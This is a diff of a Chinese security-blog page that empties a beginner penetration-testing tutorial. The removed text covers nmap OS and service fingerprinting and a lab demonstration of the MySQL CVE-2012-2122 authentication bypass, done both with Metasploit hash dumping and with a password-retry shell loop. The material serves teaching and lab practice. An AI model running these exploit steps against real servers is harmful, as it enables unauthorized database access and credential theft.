@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="web安全日志-005, 爱睡懒觉的道士">
+    <meta name="keywords" content="web安全日志-006, 爱睡懒觉的道士">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>web安全日志-005 | 爱睡懒觉的道士</title>
+    <title>web安全日志-006 | 爱睡懒觉的道士</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -324,12 +324,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/21.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/22.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">web安全日志-005</h1>
+                    <h1 class="description center-align post-title">web安全日志-006</h1>
                 </div>
             </div>
         </div>
@@ -443,25 +443,12 @@
             <div class="row tag-cate">
                 <div class="col s7">
                     
-                    <div class="article-tag">
-                        
-                            <a href="/tags/web%E5%AE%89%E5%85%A8/">
-                                <span class="chip bg-color">web安全</span>
-                            </a>
-                        
-                    </div>
+                          <div class="article-tag">
+                            <span class="chip bg-color">无标签</span>
+                          </div>
                     
                 </div>
                 <div class="col s5 right-align">
-                    
-                    <div class="post-cate">
-                        <i class="fas fa-bookmark fa-fw icon-category"></i>
-                        
-                            <a href="/categories/web%E5%AE%89%E5%85%A8/" class="post-category">
-                                web安全
-                            </a>
-                        
-                    </div>
                     
                 </div>
             </div>
@@ -470,7 +457,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2023-09-17
+                    2023-09-21
                 </div>
                 
 
@@ -479,14 +466,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    2.5k
+                    0
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    12 分
+                    1 分
                 </div>
                 
 
@@ -506,248 +493,7 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="基础入门-系统及数据库"><a href="#基础入门-系统及数据库" class="headerlink" title="基础入门-系统及数据库"></a><font size="6"><strong>基础入门-系统及数据库</strong></font></h2><span id="more"></span>
-
-<p><img src="/2023/09/17/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-005/1.png"></p>
-<h3 id="一、操作系统层面："><a href="#一、操作系统层面：" class="headerlink" title="一、操作系统层面："></a><font size="5"><strong>一、操作系统层面：</strong></font></h3><h4 id="1、识别操作系统常见方法"><a href="#1、识别操作系统常见方法" class="headerlink" title="1、识别操作系统常见方法"></a><font size="4"><strong>1、识别操作系统常见方法</strong></font></h4><p>a、有网站<br>可以通过网站识别通过网站的手工识别方法判断：<br>windows对大小写不敏感也就是说你在网页中可以替换网站路径的大小写进行测试</p>
-<p>b、没有网站<br>通过nmap进行扫描方法：<br>nmap -O IP地址</p>
-<pre class=" language-bash"><code class="language-bash">──<span class="token punctuation">(</span>root💀kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/桌面<span class="token punctuation">]</span>
-└─<span class="token comment" spellcheck="true"># nmap -O 10.1.1.10 </span>
-Starting Nmap 7.91 <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at 2021-06-07 21:06 CST
-Nmap scan report <span class="token keyword">for</span> 10.1.1.10 <span class="token punctuation">(</span>10.1.1.10<span class="token punctuation">)</span>
-Host is up <span class="token punctuation">(</span>0.0011s latency<span class="token punctuation">)</span>.
-Not shown: 999 closed ports
-PORT   STATE SERVICE
-22/tcp <span class="token function">open</span>  <span class="token function">ssh</span>
-MAC Address: 00:0C:29:13:E9:61 <span class="token punctuation">(</span>VMware<span class="token punctuation">)</span>
-Device type: general purpose
-Running: Linux 3.X<span class="token operator">|</span>4.X
-OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
-OS details: Linux 3.2 - 4.9
-Network Distance: 1 hop
-</code></pre>
-<p>备注：不是所有的系统都可以用这种方式扫描出操作系统的类型、在windows的一些高版本中无法探测，例如：</p>
-<pre class=" language-bash"><code class="language-bash">─<span class="token comment" spellcheck="true"># nmap -O 10.1.1.129</span>
-Starting Nmap 7.91 <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at 2021-06-07 21:10 CST
-Nmap scan report <span class="token keyword">for</span> 10.1.1.129 <span class="token punctuation">(</span>10.1.1.129<span class="token punctuation">)</span>
-Host is up <span class="token punctuation">(</span>0.00053s latency<span class="token punctuation">)</span>.
-Not shown: 994 closed ports
-PORT     STATE SERVICE
-80/tcp   <span class="token function">open</span>  http
-MAC Address: 00:0C:29:DC:AF:EA <span class="token punctuation">(</span>VMware<span class="token punctuation">)</span>
-No exact OS matches <span class="token keyword">for</span> host <span class="token punctuation">(</span>If you know what OS is running on it, see https://nmap.org/submit/ <span class="token punctuation">)</span>.
-TCP/IP fingerprint:
-OS:SCAN<span class="token punctuation">(</span>V<span class="token operator">=</span>7.91%E<span class="token operator">=</span>4%D<span class="token operator">=</span>6/7%OT<span class="token operator">=</span>80%CT<span class="token operator">=</span>1%CU<span class="token operator">=</span>36041%PV<span class="token operator">=</span>Y%DS<span class="token operator">=</span>1%DC<span class="token operator">=</span>D%G<span class="token operator">=</span>Y%M<span class="token operator">=</span>000C29%TM
-OS:<span class="token operator">=</span>60BE1ADE%P<span class="token operator">=</span>x86_64-pc-linux-gnu<span class="token punctuation">)</span>SEQ<span class="token punctuation">(</span>SP<span class="token operator">=</span>106%GCD<span class="token operator">=</span>1%ISR<span class="token operator">=</span>10C%TI<span class="token operator">=</span>I%CI<span class="token operator">=</span>I%II<span class="token operator">=</span>I%
-OS:SS<span class="token operator">=</span>S%TS<span class="token operator">=</span>U<span class="token punctuation">)</span>OPS<span class="token punctuation">(</span>O1<span class="token operator">=</span>M5B4NW8NNS%O2<span class="token operator">=</span>M5B4NW8NNS%O3<span class="token operator">=</span>M5B4NW8%O4<span class="token operator">=</span>M5B4NW8NNS%O5<span class="token operator">=</span>M5
-OS:B4NW8NNS%O6<span class="token operator">=</span>M5B4NNS<span class="token punctuation">)</span>WIN<span class="token punctuation">(</span>W1<span class="token operator">=</span>FFFF%W2<span class="token operator">=</span>FFFF%W3<span class="token operator">=</span>FFFF%W4<span class="token operator">=</span>FFFF%W5<span class="token operator">=</span>FFFF%W6<span class="token operator">=</span>FF70<span class="token punctuation">)</span>
-OS:ECN<span class="token punctuation">(</span>R<span class="token operator">=</span>Y%DF<span class="token operator">=</span>Y%T<span class="token operator">=</span>80%W<span class="token operator">=</span>FFFF%O<span class="token operator">=</span>M5B4NW8NNS%CC<span class="token operator">=</span>Y%Q<span class="token operator">=</span><span class="token punctuation">)</span>T1<span class="token punctuation">(</span>R<span class="token operator">=</span>Y%DF<span class="token operator">=</span>Y%T<span class="token operator">=</span>80%S<span class="token operator">=</span>O%A<span class="token operator">=</span>S+%
-OS:F<span class="token operator">=</span>AS%RD<span class="token operator">=</span>0%Q<span class="token operator">=</span><span class="token punctuation">)</span>T2<span class="token punctuation">(</span>R<span class="token operator">=</span>Y%DF<span class="token operator">=</span>Y%T<span class="token operator">=</span>80%W<span class="token operator">=</span>0%S<span class="token operator">=</span>Z%A<span class="token operator">=</span>S%F<span class="token operator">=</span>AR%O<span class="token operator">=</span>%RD<span class="token operator">=</span>0%Q<span class="token operator">=</span><span class="token punctuation">)</span>T3<span class="token punctuation">(</span>R<span class="token operator">=</span>Y%DF<span class="token operator">=</span>Y%T<span class="token operator">=</span>
-OS:80%W<span class="token operator">=</span>0%S<span class="token operator">=</span>Z%A<span class="token operator">=</span>O%F<span class="token operator">=</span>AR%O<span class="token operator">=</span>%RD<span class="token operator">=</span>0%Q<span class="token operator">=</span><span class="token punctuation">)</span>T4<span class="token punctuation">(</span>R<span class="token operator">=</span>Y%DF<span class="token operator">=</span>Y%T<span class="token operator">=</span>80%W<span class="token operator">=</span>0%S<span class="token operator">=</span>A%A<span class="token operator">=</span>O%F<span class="token operator">=</span>R%O<span class="token operator">=</span>%RD<span class="token operator">=</span>0%
-OS:Q<span class="token operator">=</span><span class="token punctuation">)</span>T5<span class="token punctuation">(</span>R<span class="token operator">=</span>Y%DF<span class="token operator">=</span>Y%T<span class="token operator">=</span>80%W<span class="token operator">=</span>0%S<span class="token operator">=</span>Z%A<span class="token operator">=</span>S+%F<span class="token operator">=</span>AR%O<span class="token operator">=</span>%RD<span class="token operator">=</span>0%Q<span class="token operator">=</span><span class="token punctuation">)</span>T6<span class="token punctuation">(</span>R<span class="token operator">=</span>Y%DF<span class="token operator">=</span>Y%T<span class="token operator">=</span>80%W<span class="token operator">=</span>0%S<span class="token operator">=</span>
-OS:A%A<span class="token operator">=</span>O%F<span class="token operator">=</span>R%O<span class="token operator">=</span>%RD<span class="token operator">=</span>0%Q<span class="token operator">=</span><span class="token punctuation">)</span>T7<span class="token punctuation">(</span>R<span class="token operator">=</span>Y%DF<span class="token operator">=</span>Y%T<span class="token operator">=</span>80%W<span class="token operator">=</span>0%S<span class="token operator">=</span>Z%A<span class="token operator">=</span>S+%F<span class="token operator">=</span>AR%O<span class="token operator">=</span>%RD<span class="token operator">=</span>0%Q<span class="token operator">=</span><span class="token punctuation">)</span>U1<span class="token punctuation">(</span>R<span class="token operator">=</span>
-OS:Y%DF<span class="token operator">=</span>N%T<span class="token operator">=</span>80%IPL<span class="token operator">=</span>164%UN<span class="token operator">=</span>0%RIPL<span class="token operator">=</span>G%RID<span class="token operator">=</span>G%RIPCK<span class="token operator">=</span>G%RUCK<span class="token operator">=</span>G%RUD<span class="token operator">=</span>G<span class="token punctuation">)</span>IE<span class="token punctuation">(</span>R<span class="token operator">=</span>Y%DFI<span class="token operator">=</span>N%
-OS:T<span class="token operator">=</span>80%CD<span class="token operator">=</span>Z<span class="token punctuation">)</span>
-</code></pre>
-<p>c、TTL</p>
-<pre class=" language-不同的操作系统的默认TTL值是不同的，"><code class="language-不同的操作系统的默认TTL值是不同的，">1、WINDOWS NT/2000   TTL：128
-2、WINDOWS 95/98     TTL：32
-3、UNIX              TTL：255
-4、LINUX             TTL：64
-5、WIN7         		  TTL：64
-</code></pre>
-<p>d、特殊端口 如（22 &#x2F; 139 &#x2F; 445 &#x2F; 1433 &#x2F; 3389）</p>
-<h4 id="2、简要两者区别及识别意义"><a href="#2、简要两者区别及识别意义" class="headerlink" title="2、简要两者区别及识别意义"></a><font size="4"><strong>2、简要两者区别及识别意义</strong></font></h4><pre class=" language-bash"><code class="language-bash">区别出不同的操作系统才能对症下药、因为windows和linux的漏洞是不一样的、可能windows的漏洞在windows上就不能运用，
-</code></pre>
-<h4 id="3、操作系统层面漏洞类型对应意义"><a href="#3、操作系统层面漏洞类型对应意义" class="headerlink" title="3、操作系统层面漏洞类型对应意义"></a><font size="4"><strong>3、操作系统层面漏洞类型对应意义</strong></font></h4><pre class=" language-bash"><code class="language-bash">不同的漏洞会造成不同漏洞利用的条件
-</code></pre>
-<h4 id="4、简要操作系统层面漏洞影响范围"><a href="#4、简要操作系统层面漏洞影响范围" class="headerlink" title="4、简要操作系统层面漏洞影响范围"></a><font size="4"><strong>4、简要操作系统层面漏洞影响范围</strong></font></h4><pre class=" language-bash"><code class="language-bash">有些漏洞会对操作系统造成崩溃、而有些系统只是蓝屏、或者是权限的提升
-</code></pre>
-<h3 id="二、数据库层面"><a href="#二、数据库层面" class="headerlink" title="二、数据库层面"></a><font size="5"><strong>二、数据库层面</strong></font></h3><h4 id="1、识别数据库类型常见方法"><a href="#1、识别数据库类型常见方法" class="headerlink" title="1、识别数据库类型常见方法"></a><font size="4"><strong>1、识别数据库类型常见方法</strong></font></h4><p>默认的语言搭配的数据库</p>
-<pre class=" language-bash"><code class="language-bash">组合类型asp + access/mssql
-组合类型php + mysql 
-组合类型aspx+mssql
-组合类型jsp +mysql/oracle
-组合类型Python + MongoDB
-</code></pre>
-<p>常见的数据库默认端口号</p>
-<pre class=" language-bash"><code class="language-bash">关系型数据库
-  mysql			3306
-  sqlserver		1433
-  oracle		1521
-  psotgresql	5432
-非关系型数据库
-  MongoDB		27017
-  Redis			6379
-  memcached		11211
-其他：
-  1527　　      Derby
-  5432　　      pgsql
-  5000　　      db2
-  9092　　      pointbase
-  无默认　      Informix
-</code></pre>
-<h4 id="2、数据库类型区别及识别意义"><a href="#2、数据库类型区别及识别意义" class="headerlink" title="2、数据库类型区别及识别意义"></a><font size="4"><strong>2、数据库类型区别及识别意义</strong></font></h4><pre class=" language-bash"><code class="language-bash">数据库的不同表示的结构也是不同、写法结构也不一样、所以产生的漏洞也不一样。
-不同的数据库的攻击方式也不完全一样。
-</code></pre>
-<h4 id="3、数据库常见漏洞类型及攻击"><a href="#3、数据库常见漏洞类型及攻击" class="headerlink" title="3、数据库常见漏洞类型及攻击"></a><font size="4"><strong>3、数据库常见漏洞类型及攻击</strong></font></h4><pre class=" language-bash"><code class="language-bash">存在弱口令
-数据库漏洞
-</code></pre>
-<h4 id="4、简要数据库层面漏洞影响范围"><a href="#4、简要数据库层面漏洞影响范围" class="headerlink" title="4、简要数据库层面漏洞影响范围"></a><font size="4"><strong>4、简要数据库层面漏洞影响范围</strong></font></h4><pre class=" language-bash"><code class="language-bash">数据库权限
-网站权限
-修改网页内容
-</code></pre>
-<h3 id="三、第三方层面"><a href="#三、第三方层面" class="headerlink" title="三、第三方层面"></a><font size="5"><strong>三、第三方层面</strong></font></h3><h4 id="1、如何判断有那些第三方平台或软件"><a href="#1、如何判断有那些第三方平台或软件" class="headerlink" title="1、如何判断有那些第三方平台或软件"></a><font size="4"><strong>1、如何判断有那些第三方平台或软件</strong></font></h4><pre class=" language-bash"><code class="language-bash">通过网站去扫描有些网站安装了第三方的软件如phpmyadmin通过扫描就可以发现他的安装目录
-判断安装了第三方软件
-
-端口扫描
-nmap -O -sV 10.1.1.130
-Starting Nmap 7.91 <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at 2021-06-08 09:26 CST
-Nmap scan report <span class="token keyword">for</span> 10.1.1.130 <span class="token punctuation">(</span>10.1.1.130<span class="token punctuation">)</span>
-Host is up <span class="token punctuation">(</span>0.00085s latency<span class="token punctuation">)</span>.
-Not shown: 978 closed ports
-PORT     STATE SERVICE     VERSION
-21/tcp   <span class="token function">open</span>  <span class="token function">ftp</span>         vsftpd 2.3.4
-22/tcp   <span class="token function">open</span>  <span class="token function">ssh</span>         OpenSSH 4.7p1 Debian 8ubuntu1 <span class="token punctuation">(</span>protocol 2.0<span class="token punctuation">)</span>
-23/tcp   <span class="token function">open</span>  telnet      Linux telnetd
-25/tcp   <span class="token function">open</span>  smtp        Postfix smtpd
-80/tcp   <span class="token function">open</span>  http        Apache httpd 2.2.8 <span class="token punctuation">((</span>Ubuntu<span class="token punctuation">)</span> DAV/2<span class="token punctuation">)</span>
-111/tcp  <span class="token function">open</span>  rpcbind     2 <span class="token punctuation">(</span>RPC <span class="token comment" spellcheck="true">#100000)</span>
-139/tcp  <span class="token function">open</span>  netbios-ssn Samba smbd 3.X - 4.X <span class="token punctuation">(</span>workgroup: WORKGROUP<span class="token punctuation">)</span>
-445/tcp  <span class="token function">open</span>  netbios-ssn Samba smbd 3.X - 4.X <span class="token punctuation">(</span>workgroup: WORKGROUP<span class="token punctuation">)</span>
-512/tcp  <span class="token function">open</span>  exec?
-513/tcp  <span class="token function">open</span>  login?
-514/tcp  <span class="token function">open</span>  tcpwrapped
-1099/tcp <span class="token function">open</span>  java-rmi    GNU Classpath grmiregistry
-1524/tcp <span class="token function">open</span>  bindshell   Metasploitable root shell
-2049/tcp <span class="token function">open</span>  nfs         2-4 <span class="token punctuation">(</span>RPC <span class="token comment" spellcheck="true">#100003)</span>
-2121/tcp <span class="token function">open</span>  <span class="token function">ftp</span>         ProFTPD 1.3.1
-3306/tcp <span class="token function">open</span>  mysql       MySQL 5.0.51a-3ubuntu5
-5432/tcp <span class="token function">open</span>  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
-5900/tcp <span class="token function">open</span>  vnc         VNC <span class="token punctuation">(</span>protocol 3.3<span class="token punctuation">)</span>
-6000/tcp <span class="token function">open</span>  X11         <span class="token punctuation">(</span>access denied<span class="token punctuation">)</span>
-6667/tcp <span class="token function">open</span>  irc         UnrealIRCd
-8009/tcp <span class="token function">open</span>  ajp13       Apache Jserv <span class="token punctuation">(</span>Protocol v1.3<span class="token punctuation">)</span>
-8180/tcp <span class="token function">open</span>  http        Apache Tomcat/Coyote JSP engine 1.1
-</code></pre>
-<h4 id="2、简要为什么要识别第三方平台或软件"><a href="#2、简要为什么要识别第三方平台或软件" class="headerlink" title="2、简要为什么要识别第三方平台或软件"></a><font size="4"><strong>2、简要为什么要识别第三方平台或软件</strong></font></h4><pre class=" language-bash"><code class="language-bash">不同的第三方软件或工具存在不同的漏洞、识别到更多的信息对收集到的漏洞也就越多
-</code></pre>
-<h4 id="3、常见第三方平台或软件漏洞类型及攻击"><a href="#3、常见第三方平台或软件漏洞类型及攻击" class="headerlink" title="3、常见第三方平台或软件漏洞类型及攻击"></a><font size="4"><strong>3、常见第三方平台或软件漏洞类型及攻击</strong></font></h4><pre class=" language-bash"><code class="language-bash">弱口令
-软件的漏洞攻击
-</code></pre>
-<h4 id="4、简要第三方平台或软件安全测试的范围"><a href="#4、简要第三方平台或软件安全测试的范围" class="headerlink" title="4、简要第三方平台或软件安全测试的范围"></a><font size="4"><strong>4、简要第三方平台或软件安全测试的范围</strong></font></h4><pre class=" language-bash"><code class="language-bash">直接获取到软件的权限便于进一步的提权和攻击
-</code></pre>
-<p>补充<br>除去常规wEB安全及APP安全测试外，类似服务器单一或复杂的其他服务（邮件，游戏，负载均衡等），也可以作为安全测试目标，此类目标测试原则只是少了wEB应用或其他安全问题。所以明确安全测试思路是很重要的!</p>
-<h3 id="四、演示案例"><a href="#四、演示案例" class="headerlink" title="四、演示案例"></a><font size="5"><strong>四、演示案例</strong></font></h3><h4 id="1、上述涉及的基础知识"><a href="#1、上述涉及的基础知识" class="headerlink" title="1、上述涉及的基础知识"></a><font size="4"><strong>1、上述涉及的基础知识</strong></font></h4><h4 id="2、演示某操作系统层面漏洞"><a href="#2、演示某操作系统层面漏洞" class="headerlink" title="2、演示某操作系统层面漏洞"></a><font size="4"><strong>2、演示某操作系统层面漏洞</strong></font></h4><h4 id="3、演示某数据库弱口令及漏洞演示"><a href="#3、演示某数据库弱口令及漏洞演示" class="headerlink" title="3、演示某数据库弱口令及漏洞演示"></a><font size="4"><strong>3、演示某数据库弱口令及漏洞演示</strong></font></h4><p><font size="3"><strong>方法1</strong></font></p>
-<p>漏洞探测</p>
-<pre class=" language-bash"><code class="language-bash">参考文档：https://vulhub.org/<span class="token comment" spellcheck="true">#/environments/mysql/CVE-2012-2122/</span>
-
-┌──<span class="token punctuation">(</span>root💀kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>
-└─<span class="token comment" spellcheck="true"># nmap -O -sV 10.1.1.133</span>
-Starting Nmap 7.91 <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at 2021-06-08 11:09 CST
-Nmap scan report <span class="token keyword">for</span> 10.1.1.133 <span class="token punctuation">(</span>10.1.1.133<span class="token punctuation">)</span>
-Host is up <span class="token punctuation">(</span>0.0011s latency<span class="token punctuation">)</span>.
-Not shown: 998 closed ports
-PORT     STATE SERVICE VERSION
-22/tcp   <span class="token function">open</span>  <span class="token function">ssh</span>     OpenSSH 7.4 <span class="token punctuation">(</span>protocol 2.0<span class="token punctuation">)</span>
-3306/tcp <span class="token function">open</span>  mysql   MySQL 5.5.23
-MAC Address: 00:0C:29:13:E9:61 <span class="token punctuation">(</span>VMware<span class="token punctuation">)</span>
-Device type: general purpose
-Running: Linux 3.X<span class="token operator">|</span>4.X
-OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
-OS details: Linux 3.2 - 4.9
-Network Distance: 1 hop
-
-OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token keyword">.</span>
-Nmap done: 1 IP address <span class="token punctuation">(</span>1 host up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> 1.88 seconds
-</code></pre>
-<p>漏洞利用</p>
-<pre class=" language-bash"><code class="language-bash">msf6 auxiliary<span class="token punctuation">(</span>scanner/mysql/mysql_hashdump<span class="token punctuation">)</span> <span class="token operator">></span> use auxiliary/scanner/mysql/mysql_authbypass_hashdump
-msf6 auxiliary<span class="token punctuation">(</span>scanner/mysql/mysql_authbypass_hashdump<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token keyword">set</span> rhosts 10.1.1.133
-rhosts <span class="token operator">=</span><span class="token operator">></span> 10.1.1.133
-msf6 auxiliary<span class="token punctuation">(</span>scanner/mysql/mysql_authbypass_hashdump<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token keyword">set</span> threads 10
-threads <span class="token operator">=</span><span class="token operator">></span> 10
-msf6 auxiliary<span class="token punctuation">(</span>scanner/mysql/mysql_authbypass_hashdump<span class="token punctuation">)</span> <span class="token operator">></span> run
-
-<span class="token punctuation">[</span>+<span class="token punctuation">]</span> 10.1.1.133:3306       - 10.1.1.133:3306 The server allows logins, proceeding with bypass <span class="token function">test</span>
-<span class="token punctuation">[</span>*<span class="token punctuation">]</span> 10.1.1.133:3306       - 10.1.1.133:3306 Authentication bypass is 10% complete
-<span class="token punctuation">[</span>*<span class="token punctuation">]</span> 10.1.1.133:3306       - 10.1.1.133:3306 Authentication bypass is 20% complete
-<span class="token punctuation">[</span>*<span class="token punctuation">]</span> 10.1.1.133:3306       - 10.1.1.133:3306 Authentication bypass is 30% complete
-<span class="token punctuation">[</span>*<span class="token punctuation">]</span> 10.1.1.133:3306       - 10.1.1.133:3306 Authentication bypass is 40% complete
-<span class="token punctuation">[</span>*<span class="token punctuation">]</span> 10.1.1.133:3306       - 10.1.1.133:3306 Authentication bypass is 50% complete
-<span class="token punctuation">[</span>*<span class="token punctuation">]</span> 10.1.1.133:3306       - 10.1.1.133:3306 Authentication bypass is 60% complete
-<span class="token punctuation">[</span>*<span class="token punctuation">]</span> 10.1.1.133:3306       - 10.1.1.133:3306 Authentication bypass is 70% complete
-<span class="token punctuation">[</span>*<span class="token punctuation">]</span> 10.1.1.133:3306       - 10.1.1.133:3306 Authentication bypass is 80% complete
-<span class="token punctuation">[</span>+<span class="token punctuation">]</span> 10.1.1.133:3306       - 10.1.1.133:3306 Successfully bypassed authentication after 847 attempts. URI: mysql://root:DBrmCST@10.1.1.133:3306
-<span class="token punctuation">[</span>+<span class="token punctuation">]</span> 10.1.1.133:3306       - 10.1.1.133:3306 Successfully exploited the authentication bypass flaw, dumping hashes<span class="token punctuation">..</span>.
-<span class="token punctuation">[</span>+<span class="token punctuation">]</span> 10.1.1.133:3306       - 10.1.1.133:3306 Saving HashString as Loot: root:*6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9
-<span class="token punctuation">[</span>+<span class="token punctuation">]</span> 10.1.1.133:3306       - 10.1.1.133:3306 Saving HashString as Loot: root:*6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9
-<span class="token punctuation">[</span>+<span class="token punctuation">]</span> 10.1.1.133:3306       - 10.1.1.133:3306 Saving HashString as Loot: root:*6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9
-<span class="token punctuation">[</span>+<span class="token punctuation">]</span> 10.1.1.133:3306       - 10.1.1.133:3306 Saving HashString as Loot: root:*6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9
-<span class="token punctuation">[</span>+<span class="token punctuation">]</span> 10.1.1.133:3306       - 10.1.1.133:3306 Saving HashString as Loot: root:*6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9
-<span class="token punctuation">[</span>+<span class="token punctuation">]</span> 10.1.1.133:3306       - 10.1.1.133:3306 Hash Table has been saved: /root/.msf4/loot/20210608111341_default_10.1.1.133_mysql.hashes_091970.txt
-<span class="token punctuation">[</span>*<span class="token punctuation">]</span> 10.1.1.133:3306       - Scanned 1 of 1 hosts <span class="token punctuation">(</span>100% complete<span class="token punctuation">)</span>
-<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Auxiliary module execution completed
-
-md5在线解密
-https://www.cmd5.com/
-</code></pre>
-<p><img src="/2023/09/17/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-005/2.png"></p>
-<pre class=" language-bash"><code class="language-bash">└─<span class="token comment" spellcheck="true"># mysql -uroot -p123456 -h10.1.1.133</span>
-Welcome to the MariaDB monitor.  Commands end with <span class="token punctuation">;</span> or \g.
-Your MySQL connection <span class="token function">id</span> is 886
-Server version: 5.5.23 Source distribution
-
-Copyright <span class="token punctuation">(</span>c<span class="token punctuation">)</span> 2000, 2018, Oracle, MariaDB Corporation Ab and others.
-
-Type <span class="token string">'help;'</span> or <span class="token string">'\h'</span> <span class="token keyword">for</span> help. Type <span class="token string">'\c'</span> to <span class="token function">clear</span> the current input statement.
-
-MySQL <span class="token punctuation">[</span><span class="token punctuation">(</span>none<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">></span> show databases<span class="token punctuation">;</span>
-+--------------------+
-<span class="token operator">|</span> Database           <span class="token operator">|</span>
-+--------------------+
-<span class="token operator">|</span> information_schema <span class="token operator">|</span>
-<span class="token operator">|</span> mysql              <span class="token operator">|</span>
-<span class="token operator">|</span> performance_schema <span class="token operator">|</span>
-<span class="token operator">|</span> <span class="token function">test</span>               <span class="token operator">|</span>
-+--------------------+
-4 rows <span class="token keyword">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span>0.001 sec<span class="token punctuation">)</span>
-</code></pre>
-<p><font size="3"><strong>方法2</strong></font></p>
-<pre class=" language-bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root💀kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>
-└─<span class="token comment" spellcheck="true"># for i in `seq 1 1000`;do mysql -uroot -pwrong -h 10.1.1.133 -P 3306; done                                                                                                      130 ⨯</span>
-ERROR 1045 <span class="token punctuation">(</span>28000<span class="token punctuation">)</span>: Access denied <span class="token keyword">for</span> user <span class="token string">'root'</span>@<span class="token string">'10.1.1.128'</span> <span class="token punctuation">(</span>using password: YES<span class="token punctuation">)</span>
-ERROR 1045 <span class="token punctuation">(</span>28000<span class="token punctuation">)</span>: Access denied <span class="token keyword">for</span> user <span class="token string">'root'</span>@<span class="token string">'10.1.1.128'</span> <span class="token punctuation">(</span>using password: YES<span class="token punctuation">)</span>
-ERROR 1045 <span class="token punctuation">(</span>28000<span class="token punctuation">)</span>: Access denied <span class="token keyword">for</span> user <span class="token string">'root'</span>@<span class="token string">'10.1.1.128'</span> <span class="token punctuation">(</span>using password: YES<span class="token punctuation">)</span>
-ERROR 1045 <span class="token punctuation">(</span>28000<span class="token punctuation">)</span>: Access denied <span class="token keyword">for</span> user <span class="token string">'root'</span>@<span class="token string">'10.1.1.128'</span> <span class="token punctuation">(</span>using password: YES<span class="token punctuation">)</span>
-ERROR 1045 <span class="token punctuation">(</span>28000<span class="token punctuation">)</span>: Access denied <span class="token keyword">for</span> user <span class="token string">'root'</span>@<span class="token string">'10.1.1.128'</span> <span class="token punctuation">(</span>using password: YES<span class="token punctuation">)</span>
-ERROR 1045 <span class="token punctuation">(</span>28000<span class="token punctuation">)</span>: Access denied <span class="token keyword">for</span> user <span class="token string">'root'</span>@<span class="token string">'10.1.1.128'</span> <span class="token punctuation">(</span>using password: YES<span class="token punctuation">)</span>
-ERROR 1045 <span class="token punctuation">(</span>28000<span class="token punctuation">)</span>: Access denied <span class="token keyword">for</span> user <span class="token string">'root'</span>@<span class="token string">'10.1.1.128'</span> <span class="token punctuation">(</span>using password: YES<span class="token punctuation">)</span>
-ERROR 1045 <span class="token punctuation">(</span>28000<span class="token punctuation">)</span>: Access denied <span class="token keyword">for</span> user <span class="token string">'root'</span>@<span class="token string">'10.1.1.128'</span> <span class="token punctuation">(</span>using password: YES<span class="token punctuation">)</span>
-ERROR 1045 <span class="token punctuation">(</span>28000<span class="token punctuation">)</span>: Access denied <span class="token keyword">for</span> user <span class="token string">'root'</span>@<span class="token string">'10.1.1.128'</span> <span class="token punctuation">(</span>using password: YES<span class="token punctuation">)</span>
-ERROR 1045 <span class="token punctuation">(</span>28000<span class="token punctuation">)</span>: Access denied <span class="token keyword">for</span> user <span class="token string">'root'</span>@<span class="token string">'10.1.1.128'</span> <span class="token punctuation">(</span>using password: YES<span class="token punctuation">)</span>
-ERROR 1045 <span class="token punctuation">(</span>28000<span class="token punctuation">)</span>: Access denied <span class="token keyword">for</span> user <span class="token string">'root'</span>@<span class="token string">'10.1.1.128'</span> <span class="token punctuation">(</span>using password: YES<span class="token punctuation">)</span>
-ERROR 1045 <span class="token punctuation">(</span>28000<span class="token punctuation">)</span>: Access denied <span class="token keyword">for</span> user <span class="token string">'root'</span>@<span class="token string">'10.1.1.128'</span> <span class="token punctuation">(</span>using password: YES<span class="token punctuation">)</span>
-Welcome to the MariaDB monitor.  Commands end with <span class="token punctuation">;</span> or \g.
-Your MySQL connection <span class="token function">id</span> is 1553
-Server version: 5.5.23 Source distribution
-
